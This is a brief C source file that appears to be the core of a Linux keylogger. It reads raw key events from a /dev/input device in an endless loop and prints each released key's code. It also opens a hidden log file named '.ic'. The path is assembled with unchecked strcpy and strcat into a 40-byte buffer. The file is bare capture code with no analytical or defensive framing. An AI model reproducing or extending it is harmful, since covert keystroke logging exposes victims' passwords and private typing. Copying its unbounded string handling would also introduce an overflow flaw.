#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOGFILE ".ic"

void read_input(char *event) {
    struct input_event ev;
    FILE *fp;
    char event_file[40];
    int fd;

    strcpy(event_file, "/dev/input/");
    strcat(event_file, event);

    printf("%s\n", event_file);
    
    // Open event file for input and log file
    fd = open(event_file, O_RDONLY);
    fp = fopen(LOGFILE, "a");

    while(1) {
        read(fd, &ev, sizeof(ev));
        if((ev.type == EV_KEY) && (ev.value == 0)) {
            printf("%d\n", ev.code);
        }
    }
}
